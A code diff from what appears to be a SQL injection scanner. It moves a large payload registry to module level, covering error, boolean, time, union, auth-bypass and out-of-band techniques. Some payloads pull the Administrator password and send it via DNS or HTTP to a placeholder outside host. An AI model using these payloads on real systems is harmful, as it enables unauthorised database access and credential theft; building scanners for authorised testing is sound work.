@@ -19,6 +19,263 @@ logger = logging.getLogger(__name__)
 
 
 
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SQLi payload registry — used by the scanner and the Payloads browser dialog
+# ─────────────────────────────────────────────────────────────────────────────
+_SQLI_PAYLOADS = {
+    # ====================================================================
+    # 1. SYNTAX BREAKING & ERROR-BASED DETECTION
+    # ====================================================================
+    "error_based": {
+        "single_quote": "'",
+        "two_single_quote": "''",
+        "double_quote": "\"",
+        "backtick": "`",
+        "semi_colon": ";",
+        "parenthesis": ")",
+        "double_parenthesis": "))",
+        "comment_dash": "-- ",
+        "comment_hash": "#",
+        "comment_cstyle": "/*",
+        "null_byte": "\x00",
+        
+        # Database-specific error triggers
+        "mysql_error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))-- ",
+        "mysql_error2": "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)-- ",
+        "pgsql_error": "' AND CAST((SELECT version()) AS INTEGER)-- ",
+        "mssql_error": "' AND 1=CONVERT(INT, @@version)-- ",
+        "oracle_error": "' AND 1=UTL_INADDR.get_host_name('localhost')-- ",
+        
+        # Stacked query detection
+        "stacked_mysql": "'; SELECT SLEEP(2)--",
+        "stacked_pgsql": "'; SELECT pg_sleep(2)--",
+        "stacked_mssql": "'; WAITFOR DELAY '00:00:02'--",
+    },
+    
+    # ====================================================================
+    # 2. BOOLEAN-BASED BLIND DETECTION
+    # ====================================================================
+    "boolean_based": {
+        # String-based boolean
+        "bool_string_true": "' OR '1'='1",
+        "bool_string_false": "' OR '1'='2",
+        "bool_string_true_alt": "' OR 'a'='a",
+        "bool_string_false_alt": "' OR 'a'='b",
+        
+        # Numeric-based boolean
+        "bool_numeric_true": " OR 1=1",
+        "bool_numeric_false": " OR 1=2",
+        "bool_numeric_true_alt": " AND 1=1",
+        "bool_numeric_false_alt": " AND 1=2",
+        
+        # AND/OR logic tests
+        "bool_and_true": "' AND '1'='1",
+        "bool_and_false": "' AND '1'='2",
+
+        # Classic tracking-cookie style (PortSwigger conditional-response pattern)
+        # xyz' AND '1'='1  vs  xyz' AND '1'='2
+        "bool_track_true":  "' AND '1'='1",
+        "bool_track_false": "' AND '1'='2",
+        # Alternative quote style
+        "bool_track_dq_true":  '" AND "1"="1',
+        "bool_track_dq_false": '" AND "1"="2',
+        # AND EXISTS subquery — confirms table exists
+        "bool_exists_users_true":  "' AND (SELECT 'a' FROM users LIMIT 1)='a",
+        "bool_exists_users_false": "' AND (SELECT 'a' FROM users WHERE '1'='2' LIMIT 1)='a",
+        # Administrator exists
+        "bool_admin_exists_true":  "' AND (SELECT 'a' FROM users WHERE username='Administrator')='a",
+        "bool_admin_exists_false": "' AND (SELECT 'a' FROM users WHERE username='NonExistentUser12345')='a",
+        
+        # Parenthesis variations
+        "bool_parenthesis_true": "') OR ('1'='1",
+        "bool_parenthesis_false": "') OR ('1'='2",
+        "bool_parenthesis2_true": ")) OR ((1=1",
+        "bool_parenthesis2_false": ")) OR ((1=2",
+        
+        # Conditional statements
+        "case_true": "' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- ",
+        "case_false": "' OR (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1-- ",
+        
+        # Database version fingerprinting
+        "mysql_if": "' OR IF(1=1,SLEEP(0),0)-- ",
+        "pgsql_if": "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END)-- ",
+    },
+    
+    # ====================================================================
+    # 3. TIME-BASED BLIND DETECTION
+    # ====================================================================
+    "time_based": {
+        # MySQL time-based
+        "time_mysql_2": "' OR SLEEP(2)-- ",
+        "time_mysql_3": "' OR SLEEP(3)-- ",
+        "time_mysql_5": "' OR SLEEP(5)-- ",
+        "time_pip_mysql": "' || SLEEP(3)--",
+        "time_mysql_benchmark": "' OR BENCHMARK(5000000,MD5(1))-- ",
+        
+        # PostgreSQL time-based
+        "time_pgsql_2": "' OR pg_sleep(2)-- ",
+        "time_pgsql_3": "' OR pg_sleep(3)-- ",
+        "time_pgsql_5": "' OR pg_sleep(5)-- ",
+        "time_pip_postgres": "' || pg_sleep(3)--",
+        
+        # MSSQL time-based
+        "time_mssql_2": "'; WAITFOR DELAY '00:00:02'-- ",
+        "time_mssql_3": "'; WAITFOR DELAY '00:00:03'-- ",
+        "time_mssql_5": "'; WAITFOR DELAY '00:00:05'-- ",
+        
+        # Oracle time-based
+        "time_oracle_2": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),2)-- ",
+        "time_oracle_3": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),3)-- ",
+        
+        # SQLite time-based (heavy computation)
+        "time_sqlite": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- ",
+        
+        # Heavy queries for time-based
+        "heavy_query_mysql": "' OR (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)-- ",
+        "heavy_query_pgsql": "' OR (SELECT COUNT(*) FROM pg_class A, pg_class B, pg_class C)-- ",
+    },
+    
+    # ====================================================================
+    # 4. UNION-BASED DETECTION
+    # ====================================================================
+    "union_based": {
+        "union_null": "' UNION SELECT NULL-- ",
+        "union_null2": "' UNION SELECT NULL,NULL-- ",
+        "union_null3": "' UNION SELECT NULL,NULL,NULL-- ",
+        "union_version_mysql": "' UNION SELECT @@version,NULL-- ",
+        "union_version_pgsql": "' UNION SELECT version(),NULL-- ",
+        "union_version_mssql": "' UNION SELECT @@version,NULL-- ",
+        "union_version_oracle": "' UNION SELECT banner FROM v$version-- ",
+        "union_dbname": "' UNION SELECT database(),NULL-- ",
+        "union_user": "' UNION SELECT user(),NULL-- ",
+    },
+    
+    # ====================================================================
+    # 5. AUTHENTICATION BYPASS & LOGIC FLAWS
+    # ====================================================================
+    "auth_bypass": {
+        "auth_admin": "admin'--",
+        "auth_admin_hash": "admin'#",
+        "auth_administrator": "administrator'--",
+        "auth_administrator_hash": "administrator'#",
+        "auth_admin_or": "' OR 1=1--",
+        "auth_admin_or_hash": "' OR 1=1#",
+        "auth_admin_or_comment": "' OR 1=1/*",
+        "auth_admin_true": "' OR 'x'='x",
+        "auth_admin_true_dash": "' OR 'x'='x'--",
+        "auth_admin_parenthesis": "') OR ('1'='1",
+        "auth_admin_universal": "' OR 1=1 LIMIT 1--",
+        "auth_admin_null": "' OR 1=1 AND SLEEP(0)--",
+    },
+
+    # ====================================================================
+    # 6. LOGIN-SPECIFIC SQLi
+    # These are used INSTEAD of the full error/boolean/time/union suite
+    # when the endpoint looks like a login form.  Goal: detect whether
+    # the field is injectable at all (error trigger) while keeping the
+    # payload count low so a login lockout is less likely.
+    # ====================================================================
+    "login_sqli": {
+        # ── Syntax probe — triggers a DB error on injectable fields ──
+        "single_quote":           "'",
+        "two_single_quotes":      "''",
+        "backslash":              "\\",
+        "double_quote":           '"',
+        "quote_comment":          "'--",
+        "quote_hash":             "'#",
+        "quote_comment_space":    "' --",
+        # ── Classic OR-true — bypasses password check ────────────────
+        "or_1_eq_1":              "' OR 1=1--",
+        "or_1_eq_1_hash":         "' OR 1=1#",
+        "or_true_string":         "' OR 'a'='a",
+        "or_true_string_dash":    "' OR 'a'='a'--",
+        "paren_or_true":          "') OR ('1'='1",
+        "paren_or_true_dash":     "') OR ('1'='1'--",
+        # ── Common username tricks ───────────────────────────────────
+        "admin_comment":          "admin'--",
+        "admin_hash":             "admin'#",
+        "admin_or":               "admin' OR '1'='1",
+        "administrator_comment":  "administrator'--",
+        "administrator_hash":     "administrator'#",
+        # ── Time probe — confirms injection even when no output ───────
+        "time_mysql":             "' OR SLEEP(2)--",
+        "time_pgsql":             "' OR pg_sleep(2)--",
+        "time_mssql":             "'; WAITFOR DELAY '00:00:02'--",
+    },
+    
+    # ====================================================================
+    # 7. CONDITIONAL ERROR-BASED BLIND (CASE WHEN 1/0)
+    # ====================================================================
+    # Technique: inject CASE WHEN (condition) THEN 1/0 ELSE 'a' END
+    # True condition → div-by-zero error (HTTP 500 / error page)
+    # False condition → 'a' = no error (HTTP 200)
+    "conditional_error": {
+        # MySQL / generic
+        "ce_mysql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'-- ",
+        "ce_mysql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'-- ",
+        # Subquery form (works on most DBs)
+        "ce_sub_true":      "' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
+        "ce_sub_false":     "' AND (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
+        # PostgreSQL
+        "ce_pgsql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)-- ",
+        "ce_pgsql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)-- ",
+        # MSSQL
+        "ce_mssql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)-- ",
+        "ce_mssql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 0 END)-- ",
+        # Data extraction probe: first char of password > 'm'
+        "ce_extract_probe": "' AND (SELECT CASE WHEN (SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'-- ",
+    },
+
+    # ====================================================================
+    # 8. VERBOSE ERROR DATA EXTRACTION (CAST to wrong type)
+    # ====================================================================
+    # Technique: CAST((SELECT sensitive_data) AS int) → DB error reveals the value
+    "verbose_error": {
+        # MySQL - EXTRACTVALUE / UPDATEXML
+        "ve_mysql_version":  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- ",
+        "ve_mysql_user":     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- ",
+        "ve_mysql_db":       "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- ",
+        "ve_mysql_updatexml":"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- ",
+        # PostgreSQL - CAST to int
+        "ve_pgsql_version":  "' AND CAST((SELECT version()) AS INTEGER)-- ",
+        "ve_pgsql_user":     "' AND CAST((SELECT current_user) AS INTEGER)-- ",
+        "ve_pgsql_db":       "' AND CAST((SELECT current_database()) AS INTEGER)-- ",
+        # MSSQL - CONVERT to int
+        "ve_mssql_version":  "' AND 1=CONVERT(INT, @@version)-- ",
+        "ve_mssql_user":     "' AND 1=CONVERT(INT, SYSTEM_USER)-- ",
+        # Generic CAST
+        "ve_cast_generic":   "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- ",
+    },
+
+    # ====================================================================
+    # 9. OUT-OF-BAND (OAST) DETECTION
+    # ====================================================================
+    # {OAST_DOMAIN} is replaced at runtime with the interactsh hostname
+    "oast": {
+        # MySQL - DNS via LOAD_FILE UNC path
+        "mysql_dns":         "' AND LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
+        # MySQL - DNS via SELECT INTO OUTFILE (sometimes works)
+        "mysql_dns2":        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
+        # MSSQL - DNS via xp_dirtree
+        "mssql_xp_dirtree": "'; EXEC master..xp_dirtree '//{OAST_DOMAIN}/a'-- ",
+        # MSSQL - DNS via xp_fileexist
+        "mssql_xp_fileexist":"'; EXEC master..xp_fileexist '//{OAST_DOMAIN}/a'-- ",
+        # MSSQL - data exfil: password as DNS subdomain
+        "mssql_exfil":       "'; DECLARE @p VARCHAR(1024);SET @p=(SELECT TOP 1 password FROM users WHERE username='Administrator');EXEC('master..xp_dirtree \"//'+ @p +'.{OAST_DOMAIN}/a\"')-- ",
+        # Oracle - DNS via UTL_HTTP
+        "oracle_utlhttp":    "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}') FROM dual-- ",
+        # Oracle - DNS via UTL_INADDR
+        "oracle_utlinaddr":  "' AND UTL_INADDR.get_host_address('{OAST_DOMAIN}')-- ",
+        # Oracle - data exfil
+        "oracle_exfil":      "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}/?d='||(SELECT password FROM users WHERE username='Administrator')||'') FROM dual-- ",
+        # PostgreSQL - DNS via COPY TO PROGRAM
+        "pgsql_copy":        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OAST_DOMAIN}'-- ",
+        # PostgreSQL - DNS via DBLINK (if extension available)
+        "pgsql_dblink":      "'; SELECT dblink_connect('host={OAST_DOMAIN} user=a password=a dbname=a')-- ",
+    }
+}
+
 class SqliScanMixin:
     """Mixin providing SQL Injection scan methods."""
 
@@ -36,258 +293,7 @@ class SqliScanMixin:
         self.scan_progress.emit("=" * 60)
         
         # Comprehensive SQLi test payloads organized by detection method
-        test_payloads = {
-            # ====================================================================
-            # 1. SYNTAX BREAKING & ERROR-BASED DETECTION
-            # ====================================================================
-            "error_based": {
-                "single_quote": "'",
-                "two_single_quote": "''",
-                "double_quote": "\"",
-                "backtick": "`",
-                "semi_colon": ";",
-                "parenthesis": ")",
-                "double_parenthesis": "))",
-                "comment_dash": "-- ",
-                "comment_hash": "#",
-                "comment_cstyle": "/*",
-                "null_byte": "\x00",
-                
-                # Database-specific error triggers
-                "mysql_error": "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))-- ",
-                "mysql_error2": "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)-- ",
-                "pgsql_error": "' AND CAST((SELECT version()) AS INTEGER)-- ",
-                "mssql_error": "' AND 1=CONVERT(INT, @@version)-- ",
-                "oracle_error": "' AND 1=UTL_INADDR.get_host_name('localhost')-- ",
-                
-                # Stacked query detection
-                "stacked_mysql": "'; SELECT SLEEP(2)--",
-                "stacked_pgsql": "'; SELECT pg_sleep(2)--",
-                "stacked_mssql": "'; WAITFOR DELAY '00:00:02'--",
-            },
-            
-            # ====================================================================
-            # 2. BOOLEAN-BASED BLIND DETECTION
-            # ====================================================================
-            "boolean_based": {
-                # String-based boolean
-                "bool_string_true": "' OR '1'='1",
-                "bool_string_false": "' OR '1'='2",
-                "bool_string_true_alt": "' OR 'a'='a",
-                "bool_string_false_alt": "' OR 'a'='b",
-                
-                # Numeric-based boolean
-                "bool_numeric_true": " OR 1=1",
-                "bool_numeric_false": " OR 1=2",
-                "bool_numeric_true_alt": " AND 1=1",
-                "bool_numeric_false_alt": " AND 1=2",
-                
-                # AND/OR logic tests
-                "bool_and_true": "' AND '1'='1",
-                "bool_and_false": "' AND '1'='2",
-
-                # Classic tracking-cookie style (PortSwigger conditional-response pattern)
-                # xyz' AND '1'='1  vs  xyz' AND '1'='2
-                "bool_track_true":  "' AND '1'='1",
-                "bool_track_false": "' AND '1'='2",
-                # Alternative quote style
-                "bool_track_dq_true":  '" AND "1"="1',
-                "bool_track_dq_false": '" AND "1"="2',
-                # AND EXISTS subquery — confirms table exists
-                "bool_exists_users_true":  "' AND (SELECT 'a' FROM users LIMIT 1)='a",
-                "bool_exists_users_false": "' AND (SELECT 'a' FROM users WHERE '1'='2' LIMIT 1)='a",
-                # Administrator exists
-                "bool_admin_exists_true":  "' AND (SELECT 'a' FROM users WHERE username='Administrator')='a",
-                "bool_admin_exists_false": "' AND (SELECT 'a' FROM users WHERE username='NonExistentUser12345')='a",
-                
-                # Parenthesis variations
-                "bool_parenthesis_true": "') OR ('1'='1",
-                "bool_parenthesis_false": "') OR ('1'='2",
-                "bool_parenthesis2_true": ")) OR ((1=1",
-                "bool_parenthesis2_false": ")) OR ((1=2",
-                
-                # Conditional statements
-                "case_true": "' OR (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- ",
-                "case_false": "' OR (CASE WHEN (1=2) THEN 1 ELSE 0 END)=1-- ",
-                
-                # Database version fingerprinting
-                "mysql_if": "' OR IF(1=1,SLEEP(0),0)-- ",
-                "pgsql_if": "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(0) ELSE pg_sleep(0) END)-- ",
-            },
-            
-            # ====================================================================
-            # 3. TIME-BASED BLIND DETECTION
-            # ====================================================================
-            "time_based": {
-                # MySQL time-based
-                "time_mysql_2": "' OR SLEEP(2)-- ",
-                "time_mysql_3": "' OR SLEEP(3)-- ",
-                "time_mysql_5": "' OR SLEEP(5)-- ",
-                "time_pip_mysql": "' || SLEEP(3)--",
-                "time_mysql_benchmark": "' OR BENCHMARK(5000000,MD5(1))-- ",
-                
-                # PostgreSQL time-based
-                "time_pgsql_2": "' OR pg_sleep(2)-- ",
-                "time_pgsql_3": "' OR pg_sleep(3)-- ",
-                "time_pgsql_5": "' OR pg_sleep(5)-- ",
-                "time_pip_postgres": "' || pg_sleep(3)--",
-                
-                # MSSQL time-based
-                "time_mssql_2": "'; WAITFOR DELAY '00:00:02'-- ",
-                "time_mssql_3": "'; WAITFOR DELAY '00:00:03'-- ",
-                "time_mssql_5": "'; WAITFOR DELAY '00:00:05'-- ",
-                
-                # Oracle time-based
-                "time_oracle_2": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),2)-- ",
-                "time_oracle_3": "' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),3)-- ",
-                
-                # SQLite time-based (heavy computation)
-                "time_sqlite": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))-- ",
-                
-                # Heavy queries for time-based
-                "heavy_query_mysql": "' OR (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)-- ",
-                "heavy_query_pgsql": "' OR (SELECT COUNT(*) FROM pg_class A, pg_class B, pg_class C)-- ",
-            },
-            
-            # ====================================================================
-            # 4. UNION-BASED DETECTION
-            # ====================================================================
-            "union_based": {
-                "union_null": "' UNION SELECT NULL-- ",
-                "union_null2": "' UNION SELECT NULL,NULL-- ",
-                "union_null3": "' UNION SELECT NULL,NULL,NULL-- ",
-                "union_version_mysql": "' UNION SELECT @@version,NULL-- ",
-                "union_version_pgsql": "' UNION SELECT version(),NULL-- ",
-                "union_version_mssql": "' UNION SELECT @@version,NULL-- ",
-                "union_version_oracle": "' UNION SELECT banner FROM v$version-- ",
-                "union_dbname": "' UNION SELECT database(),NULL-- ",
-                "union_user": "' UNION SELECT user(),NULL-- ",
-            },
-            
-            # ====================================================================
-            # 5. AUTHENTICATION BYPASS & LOGIC FLAWS
-            # ====================================================================
-            "auth_bypass": {
-                "auth_admin": "admin'--",
-                "auth_admin_hash": "admin'#",
-                "auth_administrator": "administrator'--",
-                "auth_administrator_hash": "administrator'#",
-                "auth_admin_or": "' OR 1=1--",
-                "auth_admin_or_hash": "' OR 1=1#",
-                "auth_admin_or_comment": "' OR 1=1/*",
-                "auth_admin_true": "' OR 'x'='x",
-                "auth_admin_true_dash": "' OR 'x'='x'--",
-                "auth_admin_parenthesis": "') OR ('1'='1",
-                "auth_admin_universal": "' OR 1=1 LIMIT 1--",
-                "auth_admin_null": "' OR 1=1 AND SLEEP(0)--",
-            },
-
-            # ====================================================================
-            # 6. LOGIN-SPECIFIC SQLi
-            # These are used INSTEAD of the full error/boolean/time/union suite
-            # when the endpoint looks like a login form.  Goal: detect whether
-            # the field is injectable at all (error trigger) while keeping the
-            # payload count low so a login lockout is less likely.
-            # ====================================================================
-            "login_sqli": {
-                # ── Syntax probe — triggers a DB error on injectable fields ──
-                "single_quote":           "'",
-                "two_single_quotes":      "''",
-                "backslash":              "\\",
-                "double_quote":           '"',
-                "quote_comment":          "'--",
-                "quote_hash":             "'#",
-                "quote_comment_space":    "' --",
-                # ── Classic OR-true — bypasses password check ────────────────
-                "or_1_eq_1":              "' OR 1=1--",
-                "or_1_eq_1_hash":         "' OR 1=1#",
-                "or_true_string":         "' OR 'a'='a",
-                "or_true_string_dash":    "' OR 'a'='a'--",
-                "paren_or_true":          "') OR ('1'='1",
-                "paren_or_true_dash":     "') OR ('1'='1'--",
-                # ── Common username tricks ───────────────────────────────────
-                "admin_comment":          "admin'--",
-                "admin_hash":             "admin'#",
-                "admin_or":               "admin' OR '1'='1",
-                "administrator_comment":  "administrator'--",
-                "administrator_hash":     "administrator'#",
-                # ── Time probe — confirms injection even when no output ───────
-                "time_mysql":             "' OR SLEEP(2)--",
-                "time_pgsql":             "' OR pg_sleep(2)--",
-                "time_mssql":             "'; WAITFOR DELAY '00:00:02'--",
-            },
-            
-            # ====================================================================
-            # 7. CONDITIONAL ERROR-BASED BLIND (CASE WHEN 1/0)
-            # ====================================================================
-            # Technique: inject CASE WHEN (condition) THEN 1/0 ELSE 'a' END
-            # True condition → div-by-zero error (HTTP 500 / error page)
-            # False condition → 'a' = no error (HTTP 200)
-            "conditional_error": {
-                # MySQL / generic
-                "ce_mysql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'-- ",
-                "ce_mysql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'-- ",
-                # Subquery form (works on most DBs)
-                "ce_sub_true":      "' AND (SELECT CASE WHEN (1=1) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
-                "ce_sub_false":     "' AND (SELECT CASE WHEN (1=2) THEN CAST(1/0 AS VARCHAR) ELSE 'a' END FROM dual)='a'-- ",
-                # PostgreSQL
-                "ce_pgsql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE 1 END)-- ",
-                "ce_pgsql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/(SELECT 0) ELSE 1 END)-- ",
-                # MSSQL
-                "ce_mssql_true":    "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 0 END)-- ",
-                "ce_mssql_false":   "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 0 END)-- ",
-                # Data extraction probe: first char of password > 'm'
-                "ce_extract_probe": "' AND (SELECT CASE WHEN (SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'-- ",
-            },
-
-            # ====================================================================
-            # 8. VERBOSE ERROR DATA EXTRACTION (CAST to wrong type)
-            # ====================================================================
-            # Technique: CAST((SELECT sensitive_data) AS int) → DB error reveals the value
-            "verbose_error": {
-                # MySQL - EXTRACTVALUE / UPDATEXML
-                "ve_mysql_version":  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- ",
-                "ve_mysql_user":     "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- ",
-                "ve_mysql_db":       "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- ",
-                "ve_mysql_updatexml":"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- ",
-                # PostgreSQL - CAST to int
-                "ve_pgsql_version":  "' AND CAST((SELECT version()) AS INTEGER)-- ",
-                "ve_pgsql_user":     "' AND CAST((SELECT current_user) AS INTEGER)-- ",
-                "ve_pgsql_db":       "' AND CAST((SELECT current_database()) AS INTEGER)-- ",
-                # MSSQL - CONVERT to int
-                "ve_mssql_version":  "' AND 1=CONVERT(INT, @@version)-- ",
-                "ve_mssql_user":     "' AND 1=CONVERT(INT, SYSTEM_USER)-- ",
-                # Generic CAST
-                "ve_cast_generic":   "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- ",
-            },
-
-            # ====================================================================
-            # 9. OUT-OF-BAND (OAST) DETECTION
-            # ====================================================================
-            # {OAST_DOMAIN} is replaced at runtime with the interactsh hostname
-            "oast": {
-                # MySQL - DNS via LOAD_FILE UNC path
-                "mysql_dns":         "' AND LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
-                # MySQL - DNS via SELECT INTO OUTFILE (sometimes works)
-                "mysql_dns2":        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{OAST_DOMAIN},'\\\\a'))-- ",
-                # MSSQL - DNS via xp_dirtree
-                "mssql_xp_dirtree": "'; EXEC master..xp_dirtree '//{OAST_DOMAIN}/a'-- ",
-                # MSSQL - DNS via xp_fileexist
-                "mssql_xp_fileexist":"'; EXEC master..xp_fileexist '//{OAST_DOMAIN}/a'-- ",
-                # MSSQL - data exfil: password as DNS subdomain
-                "mssql_exfil":       "'; DECLARE @p VARCHAR(1024);SET @p=(SELECT TOP 1 password FROM users WHERE username='Administrator');EXEC('master..xp_dirtree \"//'+ @p +'.{OAST_DOMAIN}/a\"')-- ",
-                # Oracle - DNS via UTL_HTTP
-                "oracle_utlhttp":    "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}') FROM dual-- ",
-                # Oracle - DNS via UTL_INADDR
-                "oracle_utlinaddr":  "' AND UTL_INADDR.get_host_address('{OAST_DOMAIN}')-- ",
-                # Oracle - data exfil
-                "oracle_exfil":      "' UNION SELECT UTL_HTTP.request('http://{OAST_DOMAIN}/?d='||(SELECT password FROM users WHERE username='Administrator')||'') FROM dual-- ",
-                # PostgreSQL - DNS via COPY TO PROGRAM
-                "pgsql_copy":        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OAST_DOMAIN}'-- ",
-                # PostgreSQL - DNS via DBLINK (if extension available)
-                "pgsql_dblink":      "'; SELECT dblink_connect('host={OAST_DOMAIN} user=a password=a dbname=a')-- ",
-            }
-        }
+        test_payloads = _SQLI_PAYLOADS
         
         if self.boost_mode:
             self.scan_progress.emit("⚡ BOOST MODE: Using parallel requests for maximum speed")
